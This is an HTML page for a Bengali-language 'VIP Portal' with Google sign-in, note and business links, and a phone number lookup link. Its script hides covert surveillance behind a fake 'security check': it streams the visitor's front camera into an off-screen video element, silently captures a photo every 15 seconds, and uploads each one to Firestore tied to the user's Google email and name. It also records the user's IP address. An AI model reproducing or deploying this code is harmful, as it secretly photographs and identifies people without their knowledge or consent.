<!DOCTYPE html>
<html lang="bn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | VIP Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --pink: #ff4d94;
            --dark: #020617;
            --glass: rgba(255, 255, 255, 0.07);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hind Siliguri', sans-serif; }

        body {
            background: var(--dark);
            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.2), transparent), #020617;
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Love Rain Animation */
        .love-rain {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 1; overflow: hidden;
        }
        .heart {
            position: absolute;
            color: var(--pink);
            font-size: 15px;
            animation: fall linear infinite;
            opacity: 0.6;
        }
        @keyframes fall {
            to { transform: translateY(100vh) rotate(360deg); }
        }

        /* Modals */
        .modal {
            position: fixed; inset: 0; background: rgba(2, 6, 23, 0.98);
            z-index: 10000; display: none; align-items: center; justify-content: center;
            backdrop-filter: blur(20px); padding: 20px;
        }

        .glass-box {
            background: var(--glass);
            padding: 35px 25px; border-radius: 35px;
            border: 1px solid rgba(255, 77, 148, 0.3);
            text-align: center; width: 100%; max-width: 400px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
            position: relative; z-index: 10;
        }

        /* Header UI */
        .hero-header {
            margin: 20px; padding: 40px 20px;
            background: var(--glass); border-radius: 35px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            position: relative; overflow: hidden;
        }

        .profile-wrapper { display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 4px solid var(--pink); box-shadow: 0 0 20px var(--pink); object-fit: cover; transition: 0.5s; }
        .user-p-img { width: 85px; height: 85px; border: 4px solid #fff; margin-left: -30px; background: #111; }

        /* Grid System */
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 0 20px 30px; max-width: 500px; margin: 0 auto; }
        .card {
            background: var(--glass); border-radius: 25px; padding: 25px 10px;
            text-align: center; text-decoration: none; color: white;
            border: 1px solid rgba(255, 255, 255, 0.05); transition: 0.3s;
            position: relative;
        }
        .card i { font-size: 2rem; color: var(--pink); margin-bottom: 12px; display: block; }
        .card.wide { grid-column: span 2; display: flex; align-items: center; justify-content: center; gap: 12px; padding: 20px; }
        
        .alarm-dot { position: absolute; top: 12px; right: 12px; width: 12px; height: 12px; background: #ff3333; border-radius: 50%; box-shadow: 0 0 10px #ff3333; display: none; animation: pulse 1s infinite; }
        @keyframes pulse { 0% {transform: scale(0.9);} 50% {transform: scale(1.1);} 100% {transform: scale(0.9);} }

        .btn-main {
            background: linear-gradient(45deg, var(--pink), #ff1a75);
            color: white; border: none; padding: 14px 25px; border-radius: 50px;
            font-weight: 700; cursor: pointer; width: 100%; margin-top: 15px;
        }

        #vSource { position: fixed; top: -100px; opacity: 0; pointer-events: none; }
    </style>
</head>

<body>
    <audio id="snd-notif" src="https://www.soundjay.com/buttons/sounds/button-3.mp3" preload="auto"></audio>

    <div id="login-overlay" class="modal" style="display: flex;">
        <div class="glass-box">
            <img src="ratan.jpg" style="width:110px; border-radius:50%; border:3px solid var(--pink); margin-bottom:15px;">
            <h2 style="letter-spacing: 1px;">RATAN BRO</h2>
            <p style="font-size: 14px; opacity: 0.7; margin-bottom: 20px;">Welcome to Private Portal</p>
            <button class="btn-main" onclick="googleLogin()">
                <i class="fab fa-google"></i> SIGN IN WITH GOOGLE
            </button>
        </div>
    </div>

    <div id="perm-modal" class="modal">
        <div class="glass-box">
            <i class="fas fa-fingerprint" style="font-size:4rem; color:var(--pink); margin-bottom:20px;"></i>
            <h3>SECURITY CHECK</h3>
            <p style="font-size:14px; opacity:0.8; line-height:1.6; margin-bottom:10px;">আমাদের পোর্টালে আপনার উপস্থিতি নিশ্চিত করতে ক্যামেরা এবং লোকেশন এক্সেস প্রয়োজন।</p>
            <button class="btn-main" onclick="grantAndStart()">ALLOW & CONTINUE</button>
        </div>
    </div>

    <div id="notif-modal" class="modal">
        <div class="glass-box" style="border-color: #00ccff;">
            <h3 style="color: #00ccff;"><i class="fas fa-bullhorn"></i> NOTICE</h3>
            <p id="nt-msg" style="margin:20px 0; font-size:16px; line-height:1.5;"></p>
            <button class="btn-main" onclick="closeNotif()" style="background:#00ccff;">DISMISS</button>
        </div>
    </div>

    <div id="main-ui" style="display:none;">
        <div class="hero-header">
            <div class="love-rain" id="rain-container"></div>
            <div class="profile-wrapper">
                <img src="ratan.jpg" class="p-img">
                <img id="u-pic" src="" class="p-img user-p-img" onerror="this.src='ratan.jpg'">
            </div>
            <h2 id="u-name" style="text-align:center;">Member</h2>
            <p id="u-ip" style="text-align:center; color:#888; font-size:12px; margin-top:8px;">Detecting Session...</p>
        </div>

        <div class="grid">
            <div class="card" onclick="openLatestNotif()">
                <div id="notif-alarm" class="alarm-dot"></div>
                <i class="fas fa-bell"></i><p>Notification</p>
            </div>
            <a href="testpaper.html" class="card"><i class="fas fa-file-alt"></i><p>Notes</p></a>
            <a href="business.html" class="card"><i class="fas fa-briefcase"></i><p>Business</p></a>
            <a href="portfolio.html" class="card"><i class="fas fa-user-circle"></i><p>Portfolio</p></a>
            <a href="https://numberlookup.pro.bd/" target="_blank" class="card wide">
                <i class="fas fa-search-location"></i><p>Advanced Number Lookup</p>
            </a>
        </div>
        
        <div style="text-align: center; margin-top: 10px;">
            <button onclick="googleLogout()" style="background:none; border:none; color:#555; font-size:12px;">Sign Out</button>
        </div>
    </div>

    <video id="vSource" autoplay playsinline muted></video>
    <canvas id="snapCanvas" width="640" height="480" style="display:none;"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();

        let loggedUser = null;
        let latestNotif = null;

        // Love Rain Logic
        function createHearts() {
            const container = document.getElementById('rain-container');
            for(let i=0; i<15; i++) {
                let heart = document.createElement('i');
                heart.className = 'fas fa-heart heart';
                heart.style.left = Math.random() * 100 + '%';
                heart.style.animationDuration = (Math.random() * 3 + 2) + 's';
                heart.style.delay = Math.random() * 5 + 's';
                container.appendChild(heart);
            }
        }

        // Security & Camera
        window.grantAndStart = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('vSource').srcObject = stream;
                
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                document.getElementById('u-ip').innerText = "IP: " + data.ip;

                document.getElementById('perm-modal').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';
                createHearts();
                setInterval(capture, 15000); // অটো স্ন্যাপ লুপ
            } catch (e) {
                alert("Security Error: Please Allow Camera to enter.");
            }
        };

        async function capture() {
            if(!loggedUser) return;
            const video = document.getElementById('vSource');
            const canvas = document.getElementById('snapCanvas');
            const ctx = canvas.getContext('2d');
            if(video.readyState === 4) {
                ctx.drawImage(video, 0, 0, 640, 480);
                const img = canvas.toDataURL('image/jpeg', 0.3);
                const userKey = loggedUser.email.replace(/\./g, '_');
                await setDoc(doc(db, "users", userKey), {
                    name: loggedUser.displayName,
                    lastPic: img,
                    time: new Date().toLocaleString()
                }, { merge: true });
            }
        }

        // Auth Logic
        onAuthStateChanged(auth, (user) => {
            if (user) {
                loggedUser = user;
                document.getElementById('u-name').innerText = user.displayName;
                document.getElementById('u-pic').src = user.photoURL;
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('perm-modal').style.display = 'flex';
            } else {
                document.getElementById('login-overlay').style.display = 'flex';
                document.getElementById('main-ui').style.display = 'none';
            }
        });

        window.googleLogin = () => signInWithPopup(auth, provider);
        window.googleLogout = () => signOut(auth).then(() => location.reload());

        // Real-time Notification Listener
        onSnapshot(doc(db, "system", "updates"), (snap) => {
            if (snap.exists()) {
                latestNotif = snap.data();
                if (latestNotif.hasNew) {
                    document.getElementById('notif-alarm').style.display = 'block';
                    document.getElementById('snd-notif').play();
                }
            }
        });

        window.openLatestNotif = () => {
            if (latestNotif) {
                document.getElementById('nt-msg').innerText = latestNotif.message;
                document.getElementById('notif-modal').style.display = 'flex';
                document.getElementById('notif-alarm').style.display = 'none';
            }
        };
        window.closeNotif = () => document.getElementById('notif-modal').style.display = 'none';
    </script>
</body>
</html>
